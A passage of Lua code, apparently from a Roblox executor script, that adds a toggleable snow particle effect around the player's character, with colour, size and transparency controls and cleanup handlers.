		emitter.Acceleration = Vector3.new(windDirection.X + swirlX, -getgenv().SnowSettings.FallSpeed * 0.2, windDirection.Z + swirlZ);
	end);
	table.insert(getgenv().SnowSettings.SnowConnections, windConnection);
	emitter.Parent = emitterAttachment;
	table.insert(getgenv().SnowSettings.SnowEmitters, emitterAttachment);
	local function Cleanup()
		if (emitterAttachment and emitterAttachment.Parent) then
			windConnection:Disconnect();
			emitterAttachment:Destroy();
			for i, v in ipairs(getgenv().SnowSettings.SnowEmitters) do
				if (v == emitterAttachment) then
					table.remove(getgenv().SnowSettings.SnowEmitters, i);
					break;
				end
			end
			for i, v in ipairs(getgenv().SnowSettings.SnowConnections) do
				if (v == windConnection) then
					table.remove(getgenv().SnowSettings.SnowConnections, i);
					break;
				end
			end
		end
	end
	humanoid.Died:Connect(Cleanup);
	character.AncestryChanged:Connect(function(_, parent)
		if not parent then
			Cleanup();
		end
	end);
	player.CharacterRemoving:Connect(Cleanup);
end;
getgenv().ClearAllSnow = function()
	for _, emitter in ipairs(getgenv().SnowSettings.SnowEmitters) do
		if (emitter and emitter.Parent) then
			emitter:Destroy();
		end
	end
	for _, connection in ipairs(getgenv().SnowSettings.SnowConnections) do
		if connection then
			connection:Disconnect();
		end
	end
	getgenv().SnowSettings.SnowEmitters = {};
	getgenv().SnowSettings.SnowConnections = {};
end;
addToggleWithNotify(SnowGroup, "SnowEnabled", {Text="Snow Effect",Default=false,Callback=function(v)
	getgenv().SnowSettings.Enabled = v;
	if v then
		local player = S.PS.LocalPlayer;
		if player.Character then
			getgenv().CreateRealSnow(player);
		end
		if getgenv().SnowRespawnConnection then
			getgenv().SnowRespawnConnection:Disconnect();
		end
		getgenv().SnowRespawnConnection = S.PS.LocalPlayer.CharacterAdded:Connect(function()
			task.wait(1);
			if getgenv().SnowSettings.Enabled then
				getgenv().CreateRealSnow(S.PS.LocalPlayer);
			end
		end);
		if getgenv().SnowCharacterChangedConnection then
			getgenv().SnowCharacterChangedConnection:Disconnect();
		end
		getgenv().SnowCharacterChangedConnection = S.PS.LocalPlayer:GetPropertyChangedSignal("Character"):Connect(function()
			if S.PS.LocalPlayer.Character then
				task.wait(1);
				if getgenv().SnowSettings.Enabled then
					getgenv().CreateRealSnow(S.PS.LocalPlayer);
				end
			end
		end);
	else
		getgenv().ClearAllSnow();
		if getgenv().SnowRespawnConnection then
			getgenv().SnowRespawnConnection:Disconnect();
			getgenv().SnowRespawnConnection = nil;
		end
		if getgenv().SnowCharacterChangedConnection then
			getgenv().SnowCharacterChangedConnection:Disconnect();
			getgenv().SnowCharacterChangedConnection = nil;
		end
	end
	Library:Notify(">_< Snow effect " .. ((v and "enabled") or "disabled"), 3);
end,Tooltip="Adds snow particle effect around your character"}):AddColorPicker("SnowColor", {Default=Color3.fromRGB(255, 255, 255),Title="Snow Color",Transparency=0,Callback=function(v)
	getgenv().SnowSettings.Color = v;
	for _, attachment in ipairs(getgenv().SnowSettings.SnowEmitters) do
		if (attachment and attachment.Parent) then
			local emitter = attachment:FindFirstChild("SnowEmitter");
			if emitter then
				emitter.Color = ColorSequence.new(v);
			end
		end
	end
end});
local SnowSettingsDependency = SnowGroup:AddDependencyBox();
SnowSettingsDependency:AddSlider("SnowMinSize", {Text="Min Size",Default=getgenv().SnowSettings.MinSize,Min=0.1,Max=2,Rounding=2,Callback=function(v)
	getgenv().SnowSettings.MinSize = v;
	for _, attachment in ipairs(getgenv().SnowSettings.SnowEmitters) do
		if (attachment and attachment.Parent) then
			local emitter = attachment:FindFirstChild("SnowEmitter");
			if emitter then
				emitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, getgenv().SnowSettings.MinSize),NumberSequenceKeypoint.new(0.5, getgenv().SnowSettings.MaxSize * 0.8),NumberSequenceKeypoint.new(1, getgenv().SnowSettings.MaxSize)});
			end
		end
	end
end});
SnowSettingsDependency:AddSlider("SnowMaxSize", {Text="Max Size",Default=getgenv().SnowSettings.MaxSize,Min=0.1,Max=3,Rounding=2,Callback=function(v)
	getgenv().SnowSettings.MaxSize = v;
	for _, attachment in ipairs(getgenv().SnowSettings.SnowEmitters) do
		if (attachment and attachment.Parent) then
			local emitter = attachment:FindFirstChild("SnowEmitter");
			if emitter then
				emitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, getgenv().SnowSettings.MinSize),NumberSequenceKeypoint.new(0.5, getgenv().SnowSettings.MaxSize * 0.8),NumberSequenceKeypoint.new(1, getgenv().SnowSettings.MaxSize)});
			end
		end
	end
end});
SnowSettingsDependency:AddSlider("SnowTransparency", {Text="Transparency",Default=getgenv().SnowSettings.Transparency,Min=0,Max=1,Rounding=2,Callback=function(v)
	getgenv().SnowSettings.Transparency = v;
	for _, attachment in ipairs(getgenv().SnowSettings.SnowEmitters) do
		if (attachment and attachment.Parent) then
			local emitter = attachment:FindFirstChild("SnowEmitter");
			if emitter then
				emitter.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, getgenv().SnowSettings.Transparency),NumberSequenceKeypoint.new(1, 1)});
			end
		end
	end
end});
SnowSettingsDependency:SetupDependencies({{Toggles.SnowEnabled,true}});
game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
	if getgenv().ClearAllSnow then
		getgenv().ClearAllSnow();
	end
end);
if getgenv().oldSnowCleanupConnection then
	getgenv().oldSnowCleanupConnection:Disconnect();
end
getgenv().oldSnowCleanupConnection = game:GetService("CoreGui").ChildRemoved:Connect(function(child)
	if ((child.Name == "ScreenGui") and getgenv().ClearAllSnow) then
		getgenv().ClearAllSnow();
	end
end);
